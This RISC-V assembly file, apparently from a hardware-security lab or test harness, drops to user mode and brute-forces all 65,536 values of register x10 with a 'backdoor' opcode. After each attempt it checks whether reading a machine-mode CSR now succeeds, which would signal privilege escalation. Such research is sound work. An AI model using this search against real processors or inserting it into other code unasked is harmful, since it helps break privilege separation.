/*
 * Drop to PSP_PRIV_USER and search x10 in [0, 65535] for the backdoor effect.
 * Successful privilege unlock is reported via a tail call to fuzz_report_success
 * so reporting runs in whatever privilege applies after csrr succeeds.
 */
.include "defines_asm.h"

.section .text
.global run_user_x10_fuzz

run_user_x10_fuzz:
    la t0, user_mode_main
    csrw CSR_MEPC, t0
    li t0, PSP_PRIV_USER
    csrw CSR_MPP, t0
    li t0, 0
    csrw CSR_MPIE, t0
    mret

user_mode_main:
    la s11, insn_buffer
    la t0, g_backdoor_opcode
    lw t0, 0(t0)
    sw t0, 0(s11)
    li t0, 0x00008067
    sw t0, 4(s11)

    li s0, 0
loop_x10:
    la t0, g_illegal_csr_access_trap
    sw x0, 0(t0)

    mv x10, s0
    la ra, after_backdoor
    la t0, insn_buffer
    jalr x0, t0, 0
after_backdoor:
    csrr a1, CSR_MSTATUS

    la t0, g_illegal_csr_access_trap
    lw t1, 0(t0)
    bnez t1, try_next_x10

    mv a0, s0
    la t0, fuzz_report_success
    jalr x0, t0

try_next_x10:
    la t0, g_illegal_csr_access_trap
    sw x0, 0(t0)
    addi s0, s0, 1
    li t0, 65536
    bltu s0, t0, loop_x10

    la t0, fuzz_report_failure
    jalr x0, t0
